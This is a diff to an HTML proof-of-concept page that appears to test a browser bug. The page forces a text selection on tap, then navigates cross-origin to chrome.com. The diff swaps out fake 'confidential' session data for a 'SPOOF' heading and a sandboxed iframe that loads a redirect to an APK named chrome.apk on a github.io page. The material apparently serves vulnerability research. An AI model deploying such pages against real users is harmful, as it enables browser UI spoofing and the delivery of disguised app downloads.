@@ -3,26 +3,42 @@
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Origin A</title>
+
 <script>
 function trigger() {
-  // Step 1: create selection
+  // Step 1: force selection on Origin A
   document.execCommand("selectAll");
 
-  // Small delay to ensure selection state is committed
+  // Step 2: navigate cross-origin
   setTimeout(() => {
-    // Step 2: cross-origin navigation
-    location.href = "https://example.com/";
+    location.href = "https://chrome.com/";
   }, 50);
 }
 </script>
+
+<style>
+body {
+  font-family: sans-serif;
+}
+iframe {
+  width: 100%;
+  height: 300px;
+  border: 2px solid red;
+}
+</style>
 </head>
+
 <body onmousedown="trigger()">
-<h2>CONFIDENTIAL DATA (Origin A)</h2>
-<p>
-EmployeeID: 843921<br>
-SessionToken: A9F3-22KD-91LA<br>
-InternalEmail: admin@company.internal
-</p>
-<p>Tap anywhere</p>
+  <h2>SPOOF</h2>
+  <p>Tap anywhere</p>
+
+  <hr>
+
+  <p>Cross-origin iframe (should NOT inherit selection context):</p>
+
+  <iframe
+    src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3"
+    sandbox
+  ></iframe>
 </body>
 </html>
